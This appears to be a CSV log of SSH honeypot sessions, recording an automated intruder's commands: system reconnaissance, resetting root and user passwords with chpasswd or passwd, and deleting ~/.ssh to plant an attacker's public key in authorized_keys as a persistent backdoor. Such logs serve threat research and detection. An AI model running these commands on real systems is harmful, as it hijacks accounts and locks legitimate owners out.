,session,duration,command_freq,input
4520,9409bfd9e2cf,13.51843786239624,15,uname
4521,9409bfd9e2cf,13.51843786239624,15,uname -a
4522,9409bfd9e2cf,13.51843786239624,15,lscpu | grep Model
4523,9409bfd9e2cf,13.51843786239624,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4524,6ff060371f1a,16.299005031585693,18,cat /proc/cpuinfo | grep name | wc -l
4525,6ff060371f1a,16.299005031585693,18,"echo -e ""tomcat7\nUwm0eLJJtIj3\nUwm0eLJJtIj3""|passwd|bash"
4526,6ff060371f1a,16.299005031585693,18,Enter new UNIX password: 
4527,6ff060371f1a,16.299005031585693,18,Enter new UNIX password:
4528,6ff060371f1a,16.299005031585693,18,"echo ""tomcat7\nUwm0eLJJtIj3\nUwm0eLJJtIj3\n""|passwd"
4529,6ff060371f1a,16.299005031585693,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4530,6ff060371f1a,16.299005031585693,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4531,6ff060371f1a,16.299005031585693,18,ls -lh $(which ls)
4532,6ff060371f1a,16.299005031585693,18,which ls
4533,6ff060371f1a,16.299005031585693,18,crontab -l
4534,6ff060371f1a,16.299005031585693,18,w
4535,6ff060371f1a,16.299005031585693,18,uname -m
4536,6ff060371f1a,16.299005031585693,18,cat /proc/cpuinfo | grep model | grep name | wc -l
4537,6ff060371f1a,16.299005031585693,18,top
4538,6ff060371f1a,16.299005031585693,18,uname
4539,6ff060371f1a,16.299005031585693,18,uname -a
4540,6ff060371f1a,16.299005031585693,18,lscpu | grep Model
4541,6ff060371f1a,16.299005031585693,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4542,9d7be25a54eb,14.5110821723938,15,cat /proc/cpuinfo | grep name | wc -l
4543,9d7be25a54eb,14.5110821723938,15,"echo ""root:jaDSxl9vS4v9""|chpasswd|bash"
4544,9d7be25a54eb,14.5110821723938,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4545,9d7be25a54eb,14.5110821723938,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4546,9d7be25a54eb,14.5110821723938,15,ls -lh $(which ls)
4547,9d7be25a54eb,14.5110821723938,15,which ls
4548,9d7be25a54eb,14.5110821723938,15,crontab -l
4549,9d7be25a54eb,14.5110821723938,15,w
4550,9d7be25a54eb,14.5110821723938,15,uname -m
4551,9d7be25a54eb,14.5110821723938,15,cat /proc/cpuinfo | grep model | grep name | wc -l
4552,9d7be25a54eb,14.5110821723938,15,top
4553,9d7be25a54eb,14.5110821723938,15,uname
4554,9d7be25a54eb,14.5110821723938,15,uname -a
4555,9d7be25a54eb,14.5110821723938,15,lscpu | grep Model
4556,9d7be25a54eb,14.5110821723938,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4557,d110240d3949,14.96176815032959,15,cat /proc/cpuinfo | grep name | wc -l
4558,d110240d3949,14.96176815032959,15,"echo ""root:yXdBVNxHYk1y""|chpasswd|bash"
4559,d110240d3949,14.96176815032959,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4560,d110240d3949,14.96176815032959,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4561,d110240d3949,14.96176815032959,15,ls -lh $(which ls)
4562,d110240d3949,14.96176815032959,15,which ls
4563,d110240d3949,14.96176815032959,15,crontab -l
4564,d110240d3949,14.96176815032959,15,w
4565,d110240d3949,14.96176815032959,15,uname -m
4566,d110240d3949,14.96176815032959,15,cat /proc/cpuinfo | grep model | grep name | wc -l
4567,d110240d3949,14.96176815032959,15,top
4568,d110240d3949,14.96176815032959,15,uname
4569,d110240d3949,14.96176815032959,15,uname -a
4570,d110240d3949,14.96176815032959,15,lscpu | grep Model
4571,d110240d3949,14.96176815032959,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4572,b6835eb76754,11.93402624130249,18,cat /proc/cpuinfo | grep name | wc -l
4573,b6835eb76754,11.93402624130249,18,"echo -e ""1q2w3e\nXYk22phazhaw\nXYk22phazhaw""|passwd|bash"
4574,b6835eb76754,11.93402624130249,18,Enter new UNIX password: 
4575,b6835eb76754,11.93402624130249,18,Enter new UNIX password:
4576,b6835eb76754,11.93402624130249,18,"echo ""1q2w3e\nXYk22phazhaw\nXYk22phazhaw\n""|passwd"
4577,b6835eb76754,11.93402624130249,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4578,b6835eb76754,11.93402624130249,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4579,b6835eb76754,11.93402624130249,18,ls -lh $(which ls)
4580,b6835eb76754,11.93402624130249,18,which ls
4581,b6835eb76754,11.93402624130249,18,crontab -l
4582,b6835eb76754,11.93402624130249,18,w
4583,b6835eb76754,11.93402624130249,18,uname -m
4584,b6835eb76754,11.93402624130249,18,cat /proc/cpuinfo | grep model | grep name | wc -l
4585,b6835eb76754,11.93402624130249,18,top
4586,b6835eb76754,11.93402624130249,18,uname
4587,b6835eb76754,11.93402624130249,18,uname -a
4588,b6835eb76754,11.93402624130249,18,lscpu | grep Model
4589,b6835eb76754,11.93402624130249,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4590,6582fbb7b0d5,21.68572306632996,15,cat /proc/cpuinfo | grep name | wc -l
4591,6582fbb7b0d5,21.68572306632996,15,"echo ""root:1QB4x1GUsmTf""|chpasswd|bash"
4592,6582fbb7b0d5,21.68572306632996,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4593,6582fbb7b0d5,21.68572306632996,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4594,6582fbb7b0d5,21.68572306632996,15,ls -lh $(which ls)
4595,6582fbb7b0d5,21.68572306632996,15,which ls
4596,6582fbb7b0d5,21.68572306632996,15,crontab -l
4597,6582fbb7b0d5,21.68572306632996,15,w
4598,6582fbb7b0d5,21.68572306632996,15,uname -m
4599,6582fbb7b0d5,21.68572306632996,15,cat /proc/cpuinfo | grep model | grep name | wc -l
4600,6582fbb7b0d5,21.68572306632996,15,top
4601,6582fbb7b0d5,21.68572306632996,15,uname
4602,6582fbb7b0d5,21.68572306632996,15,uname -a
4603,6582fbb7b0d5,21.68572306632996,15,lscpu | grep Model
4604,6582fbb7b0d5,21.68572306632996,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4605,466dbe7f019a,13.424179792404177,15,cat /proc/cpuinfo | grep name | wc -l
4606,466dbe7f019a,13.424179792404177,15,"echo ""root:MOWIyUlonwPE""|chpasswd|bash"
4607,90f34d112f3f,13.38382053375244,15,cat /proc/cpuinfo | grep name | wc -l
4608,466dbe7f019a,13.424179792404177,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4609,90f34d112f3f,13.38382053375244,15,"echo ""root:8KUmwLqWDUH0""|chpasswd|bash"
4610,466dbe7f019a,13.424179792404177,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4611,90f34d112f3f,13.38382053375244,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4612,466dbe7f019a,13.424179792404177,15,ls -lh $(which ls)
4613,466dbe7f019a,13.424179792404177,15,which ls
4614,90f34d112f3f,13.38382053375244,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4615,466dbe7f019a,13.424179792404177,15,crontab -l
4616,90f34d112f3f,13.38382053375244,15,ls -lh $(which ls)
4617,90f34d112f3f,13.38382053375244,15,which ls
4618,466dbe7f019a,13.424179792404177,15,w
4619,90f34d112f3f,13.38382053375244,15,crontab -l
4620,466dbe7f019a,13.424179792404177,15,uname -m
4621,90f34d112f3f,13.38382053375244,15,w
4622,466dbe7f019a,13.424179792404177,15,cat /proc/cpuinfo | grep model | grep name | wc -l
4623,90f34d112f3f,13.38382053375244,15,uname -m
4624,466dbe7f019a,13.424179792404177,15,top
4625,90f34d112f3f,13.38382053375244,15,cat /proc/cpuinfo | grep model | grep name | wc -l
4626,466dbe7f019a,13.424179792404177,15,uname
4627,90f34d112f3f,13.38382053375244,15,top
4628,466dbe7f019a,13.424179792404177,15,uname -a
4629,90f34d112f3f,13.38382053375244,15,uname
4630,466dbe7f019a,13.424179792404177,15,lscpu | grep Model
4631,90f34d112f3f,13.38382053375244,15,uname -a
4632,466dbe7f019a,13.424179792404177,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4633,90f34d112f3f,13.38382053375244,15,lscpu | grep Model
4634,90f34d112f3f,13.38382053375244,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4635,6fcc24543202,55.67803883552551,15,cat /proc/cpuinfo | grep name | wc -l
4636,6fcc24543202,55.67803883552551,15,"echo ""root:d0yiVqrXxKMt""|chpasswd|bash"
4637,6fcc24543202,55.67803883552551,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4638,6fcc24543202,55.67803883552551,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4639,6fcc24543202,55.67803883552551,15,ls -lh $(which ls)
4640,6fcc24543202,55.67803883552551,15,which ls
4641,0ce9674f29ef,55.70762872695923,15,cat /proc/cpuinfo | grep name | wc -l
4642,6fcc24543202,55.67803883552551,15,crontab -l
4643,0ce9674f29ef,55.70762872695923,15,"echo ""root:J55hcPmB39fx""|chpasswd|bash"
4644,6fcc24543202,55.67803883552551,15,w
4645,0ce9674f29ef,55.70762872695923,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4646,6fcc24543202,55.67803883552551,15,uname -m
4647,0ce9674f29ef,55.70762872695923,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4648,6fcc24543202,55.67803883552551,15,cat /proc/cpuinfo | grep model | grep name | wc -l
4649,0ce9674f29ef,55.70762872695923,15,ls -lh $(which ls)
4650,0ce9674f29ef,55.70762872695923,15,which ls
4651,6fcc24543202,55.67803883552551,15,top
4652,0ce9674f29ef,55.70762872695923,15,crontab -l
4653,6fcc24543202,55.67803883552551,15,uname
4654,0ce9674f29ef,55.70762872695923,15,w
4655,6fcc24543202,55.67803883552551,15,uname -a
4656,0ce9674f29ef,55.70762872695923,15,uname -m
4657,6fcc24543202,55.67803883552551,15,lscpu | grep Model
4658,0ce9674f29ef,55.70762872695923,15,cat /proc/cpuinfo | grep model | grep name | wc -l
4659,6fcc24543202,55.67803883552551,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4660,0ce9674f29ef,55.70762872695923,15,top
4661,0ce9674f29ef,55.70762872695923,15,uname
4662,0ce9674f29ef,55.70762872695923,15,uname -a
4663,0ce9674f29ef,55.70762872695923,15,lscpu | grep Model
4664,0ce9674f29ef,55.70762872695923,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4665,7e4422daa00f,87.31602311134338,18,cat /proc/cpuinfo | grep name | wc -l
4666,7e4422daa00f,87.31602311134338,18,"echo -e ""vanessa\n7vldCFlrr4Eb\n7vldCFlrr4Eb""|passwd|bash"
4667,7e4422daa00f,87.31602311134338,18,Enter new UNIX password: 
4668,7e4422daa00f,87.31602311134338,18,Enter new UNIX password:
4669,7e4422daa00f,87.31602311134338,18,"echo ""vanessa\n7vldCFlrr4Eb\n7vldCFlrr4Eb\n""|passwd"
4670,7e4422daa00f,87.31602311134338,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4671,7e4422daa00f,87.31602311134338,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4672,7e4422daa00f,87.31602311134338,18,ls -lh $(which ls)
4673,7e4422daa00f,87.31602311134338,18,which ls
4674,7e4422daa00f,87.31602311134338,18,crontab -l
4675,7e4422daa00f,87.31602311134338,18,w
4676,7e4422daa00f,87.31602311134338,18,uname -m
4677,7e4422daa00f,87.31602311134338,18,cat /proc/cpuinfo | grep model | grep name | wc -l
4678,7e4422daa00f,87.31602311134338,18,top
4679,7e4422daa00f,87.31602311134338,18,uname
4680,7e4422daa00f,87.31602311134338,18,uname -a
4681,7e4422daa00f,87.31602311134338,18,lscpu | grep Model
4682,7e4422daa00f,87.31602311134338,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4683,b3edc60174ec,107.49878787994383,18,cat /proc/cpuinfo | grep name | wc -l
4684,b3edc60174ec,107.49878787994383,18,"echo -e ""web85p1\n4SYeb41HL1Kg\n4SYeb41HL1Kg""|passwd|bash"
4685,b3edc60174ec,107.49878787994383,18,Enter new UNIX password: 
4686,b3edc60174ec,107.49878787994383,18,Enter new UNIX password:
4687,b3edc60174ec,107.49878787994383,18,"echo ""web85p1\n4SYeb41HL1Kg\n4SYeb41HL1Kg\n""|passwd"
4688,b3edc60174ec,107.49878787994383,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4689,b3edc60174ec,107.49878787994383,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4690,b3edc60174ec,107.49878787994383,18,ls -lh $(which ls)
4691,b3edc60174ec,107.49878787994383,18,which ls
4692,b3edc60174ec,107.49878787994383,18,crontab -l
4693,b3edc60174ec,107.49878787994383,18,w
4694,b3edc60174ec,107.49878787994383,18,uname -m
4695,b3edc60174ec,107.49878787994383,18,cat /proc/cpuinfo | grep model | grep name | wc -l
4696,b3edc60174ec,107.49878787994383,18,top
4697,b3edc60174ec,107.49878787994383,18,uname
4698,b3edc60174ec,107.49878787994383,18,uname -a
4699,b3edc60174ec,107.49878787994383,18,lscpu | grep Model
4700,b3edc60174ec,107.49878787994383,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4701,f2b872214bdb,151.2511432170868,14,cat /proc/cpuinfo | grep name | wc -l
4702,f2b872214bdb,151.2511432170868,14,"echo ""root:oz9J2WLslwaT""|chpasswd|bash"
4703,f2b872214bdb,151.2511432170868,14,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4704,7215208bbc91,181.1101269721985,15,cat /proc/cpuinfo | grep name | wc -l
4705,f2b872214bdb,151.2511432170868,14,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4706,f2b872214bdb,151.2511432170868,14,ls -lh $(which ls)
4707,f2b872214bdb,151.2511432170868,14,which ls
4708,7215208bbc91,181.1101269721985,15,"echo ""root:YC3YY5VSAFJR""|chpasswd|bash"
4709,f2b872214bdb,151.2511432170868,14,crontab -l
4710,7215208bbc91,181.1101269721985,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4711,f2b872214bdb,151.2511432170868,14,w
4712,f2b872214bdb,151.2511432170868,14,uname -m
4713,7215208bbc91,181.1101269721985,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4714,f2b872214bdb,151.2511432170868,14,cat /proc/cpuinfo | grep model | grep name | wc -l
4715,7215208bbc91,181.1101269721985,15,ls -lh $(which ls)
4716,7215208bbc91,181.1101269721985,15,which ls
4717,f2b872214bdb,151.2511432170868,14,top
4718,7215208bbc91,181.1101269721985,15,crontab -l
4719,7215208bbc91,181.1101269721985,15,w
4720,f2b872214bdb,151.2511432170868,14,uname -a
4721,f2b872214bdb,151.2511432170868,14,lscpu | grep Model
4722,7215208bbc91,181.1101269721985,15,uname -m
4723,f2b872214bdb,151.2511432170868,14,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4724,7215208bbc91,181.1101269721985,15,cat /proc/cpuinfo | grep model | grep name | wc -l
4725,7215208bbc91,181.1101269721985,15,top
4726,7215208bbc91,181.1101269721985,15,uname
4727,7215208bbc91,181.1101269721985,15,uname -a
4728,7215208bbc91,181.1101269721985,15,lscpu | grep Model
4729,7215208bbc91,181.1101269721985,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4730,01726df5437d,60.86350989341736,15,cat /proc/cpuinfo | grep name | wc -l
